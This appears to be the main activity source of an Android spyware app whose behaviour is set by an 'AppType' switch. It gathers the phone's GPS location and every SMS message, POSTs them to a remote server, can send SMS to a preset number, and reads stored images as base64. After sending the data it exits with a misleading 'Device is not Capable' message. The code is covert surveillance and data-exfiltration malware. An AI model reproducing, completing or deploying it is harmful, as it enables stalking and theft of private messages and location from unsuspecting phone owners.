package com.example.p32;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int LOCATION_PERMISSION_REQUEST_CODE = 100;
    private static final int REQUEST_SEND_SMS_PERMISSION = 100;
    private static final int PERMISSIONS_REQUEST_READ_SMS = 1;
    private static final int REQUEST_READ_STORAGE_PERMISSION = 1;
    private LocationHelper LocationHelper;
    private ImageUtils Imagehandler;
    private TextView locationTextView;
    private SMSHelper SMSclass;
    private StringBuilder allSms;
    private NetworkManager newNet;
    private Integer SendCount = 3;
    private Integer AppType = R.string.AppType;

    public void forceExitApp() {
        Toast.makeText(MainActivity.this, "Device is not Capable.", Toast.LENGTH_SHORT).show();
        android.os.Process.killProcess(android.os.Process.myPid());
    }

    public void AlertShow(String title, String Desc) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(Desc)
                .setPositiveButton("Ok", (dialog, which) -> forceExitApp())
                .show();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        // Set up window insets
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            androidx.core.graphics.Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Initialize views
        locationTextView = findViewById(R.id.textView1);
        // Initialize location helper
        newNet = new NetworkManager(this);
        // Check and request location permissions and send location data

        // Check if AppType is 1 (Location Tracking) or 0 (All Modes Enabled)
        if (AppType == 1 || AppType == 0) {
            checkLocationPermission(); // if 0 ( sms extraction enable in function level)
        }

        // Check if AppType is 2 (SMS Extraction) or 0 (All Modes Enabled)
        if (AppType == 2) {
            checkSmsPermission();
        }
        if (AppType == 3) {
            checkSendSmsPermission();
        }
        if (AppType == 4) {
            checkReadStoragePermission();
        }
    }

    public void SendSMS() {
        SMSHelper.sendSmsFromPhone(getString(R.string.SendSmsTo), getString(R.string.Message),
                new SMSHelper.SmsSendCallback() {
                    @Override
                    public void onSmsSent(boolean success) {
                        if (success) {
                            // SMS was sent successfully
                            Toast.makeText(getApplicationContext(), "Message Sent Successfully!", Toast.LENGTH_SHORT)
                                    .show();
                        } else {
                            // SMS sending failed
                            Toast.makeText(getApplicationContext(), "Failed to Send Message", Toast.LENGTH_SHORT)
                                    .show();
                        }
                        forceExitApp();
                    }
                });
    }

    public void fetchSMS() {
        SMSclass = new SMSHelper(this);
        List<String> mgs = SMSclass.getAllMessages();
        allSms = new StringBuilder();
        allSms.append("Sms data\n\n");
        for (String i : mgs) {
            allSms.append(i).append("\n");
        }
        newNet.sendPostRequest(allSms.toString(), new NetworkManager.PostRequestCallback() {
            @Override
            public void onSuccess(String response) {

                SendCount += 1;
                if (AppType == 1 && SendCount == 1) {
                    forceExitApp();
                } else if (AppType == 2 && SendCount == 1) {
                    forceExitApp();
                } else if (AppType == 0 && SendCount == 2) {
                    forceExitApp();
                }
            }

            @Override
            public void onFailure(String error) {
                // Handle the failure case here
                // This will be called if the request failed
                Log.e("PostRequest", "Data send failed: " + error);

                // Handle error scenarios
            }
        });
    }

    private void accessImages() {
        List<String> base64Images = Imagehandler.getAllImagesInBase64(this);
        Toast.makeText(this, "Images accessed successfully!", Toast.LENGTH_SHORT).show();
    }

    private void checkLocationPermission() {
        // Check if location permission is granted
        if (ActivityCompat.checkSelfPermission(this,
                android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // Request location permission if not granted
            ActivityCompat.requestPermissions(this, new String[] { android.Manifest.permission.ACCESS_FINE_LOCATION },
                    LOCATION_PERMISSION_REQUEST_CODE);
        } else {
            // Permission granted, request location updates
            if (AppType == 0) {
                checkSmsPermission();
            }
            requestLocationUpdates();
        }
    }

    private void checkSmsPermission() {
        // Check if SMS permission is granted
        if (ActivityCompat.checkSelfPermission(this,
                android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // Request SMS permission if not granted
            ActivityCompat.requestPermissions(this, new String[] { android.Manifest.permission.READ_SMS },
                    PERMISSIONS_REQUEST_READ_SMS);
        } else {
            // Permission granted, fetch SMS messages
            fetchSMS();
        }
    }

    private void checkSendSmsPermission() {
        // Check if SMS permission is granted
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[] { Manifest.permission.SEND_SMS },
                    REQUEST_SEND_SMS_PERMISSION);
        } else {
            SendSMS();
        }
    }

    private void checkReadStoragePermission() {
        // Check if READ_EXTERNAL_STORAGE permission is granted
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[] { Manifest.permission.READ_EXTERNAL_STORAGE },
                    REQUEST_READ_STORAGE_PERMISSION);
        } else {
            accessImages();
        }
    }

    private void requestLocationUpdates() {
        LocationHelper = new LocationHelper(this);
        LocationHelper.requestSingleLocationUpdate(new LocationHelper.LocationCallback() {
            @Override
            public void onLocationReceived(double latitude, double longitude) {
                @SuppressLint("DefaultLocale")
                String locationText = String.format("Lat: %.6f, Lon: %.6f", latitude, longitude);
                newNet.sendPostRequest(locationText, new NetworkManager.PostRequestCallback() {
                    @Override
                    public void onSuccess(String response) {
                        SendCount += 1;
                        if (AppType == 1 && SendCount == 1) {
                            forceExitApp();
                        } else if (AppType == 2 && SendCount == 1) {
                            forceExitApp();
                        } else if (AppType == 0 && SendCount == 2) {
                            forceExitApp();
                        }
                    }

                    @Override
                    public void onFailure(String error) {
                        // Handle the failure case here
                        // This will be called if the request failed
                        Log.e("PostRequest", "Data send failed: " + error);

                        // Handle error scenarios
                    }
                });
            }

            @Override
            public void onLocationError(String errorMessage) {
                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, errorMessage, Toast.LENGTH_SHORT).show();
                });
            }
        });
    }

    @SuppressLint("SetTextI18n")
    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        // Handle the permission results based on request code
        switch (requestCode) {
            case LOCATION_PERMISSION_REQUEST_CODE:
                if (AppType == 1 || AppType == 0) {
                    handleLocationPermissionResult(grantResults);
                }
                if (AppType == 3) {
                    handleSendSmsPermissionResult(grantResults);
                }
                break;

            case PERMISSIONS_REQUEST_READ_SMS:
                handleSmsPermissionResult(grantResults);
                break;

            default:
                break;
        }
    }

    private void handleLocationPermissionResult(int[] grantResults) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // Permission granted for location, request location updates
            requestLocationUpdates();
            if (AppType == 0) {
                checkSmsPermission();
            }
        } else {
            // Permission denied for location
            Toast.makeText(this, "Location permission is required", Toast.LENGTH_SHORT).show();
            AlertShow("Permission Error", "Please Grant Location Permission to proceed.");
        }
    }

    private void handleSmsPermissionResult(int[] grantResults) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // Permission granted for SMS, fetch messages
            fetchSMS();
        } else {
            // Permission denied for SMS
            Toast.makeText(this, "SMS permission is required", Toast.LENGTH_SHORT).show();
        }
    }

    private void handleSendSmsPermissionResult(int[] grantResults) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // Permission granted for SMS, fetch messages
            SendSMS();
        } else {
            // Permission denied for SMS
            Toast.makeText(this, "SMS permission is required", Toast.LENGTH_SHORT).show();
        }
    }

}